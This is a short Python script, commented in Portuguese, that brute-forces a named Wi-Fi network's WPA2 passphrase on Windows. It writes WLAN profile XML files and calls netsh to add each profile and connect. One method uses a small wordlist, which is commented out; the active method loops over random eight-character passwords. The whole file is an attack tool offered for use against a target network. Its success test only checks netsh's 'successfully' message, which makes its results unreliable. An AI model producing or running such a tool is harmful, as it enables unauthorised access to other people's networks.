import os
import subprocess
import time
from random import choice

# Lista de caracteres disponíveis para gerar senhas aleatórias
letras = [
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
    'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
    'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
    'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
    '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '_', '=', '+'
]

# Função para testar uma senha
def testar_senha(ssid, senha):
    # Cria um perfil temporário para a rede Wi-Fi
    config = f"""
        <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
            <name>{ssid}</name>
            <SSIDConfig>
                <SSID>
                    <name>{ssid}</name>
                </SSID>
            </SSIDConfig>
            <connectionType>ESS</connectionType>
            <connectionMode>manual</connectionMode>
            <MSM>
                <security>
                    <authEncryption>
                        <authentication>WPA2PSK</authentication>
                        <encryption>AES</encryption>
                        <useOneX>false</useOneX>
                    </authEncryption>
                    <sharedKey>
                        <keyType>passPhrase</keyType>
                        <protected>false</protected>
                        <keyMaterial>{senha}</keyMaterial>
                    </sharedKey>
                </security>
            </MSM>
        </WLANProfile>
    """
    # Salva o perfil em um arquivo temporário
    with open("wifi_profile.xml", "w") as file:
        file.write(config)

    # Adiciona o perfil no sistema e tenta conectar
    subprocess.run(["netsh", "wlan", "add", "profile", "filename=wifi_profile.xml"], capture_output=True)
    result = subprocess.run(["netsh", "wlan", "connect", "name=" + ssid], capture_output=True, text=True)

    # Verifica se a conexão foi bem-sucedida
    #time.sleep(5)  # Aguarda um tempo para a tentativa de conexão
    if "successfully" in result.stdout.lower():
        print(f"Senha encontrada: {senha}")
        return True
    else:
        return False

# Rede alvo
ssid = input("Digite o nome da rede (SSID): ")

# Método 1: Usando uma wordlist
#wordlist = ["12345678", "password", "qwerty", "senha123"]  # Substituir por uma lista maior, se necessário
#for senha in wordlist:
#    print(f"Tentando: {senha}")
#    if testar_senha(ssid, senha):
#        break
#else:
#    print("Nenhuma senha da lista funcionou.")

#Método 2: Gerando senhas aleatórias
#Descomente para usar tentativas aleatórias
while True:
    senha = "".join(choice(letras) for _ in range(8))  # Senha de 8 caracteres
    print(senha)
    if testar_senha(ssid, senha):
        break
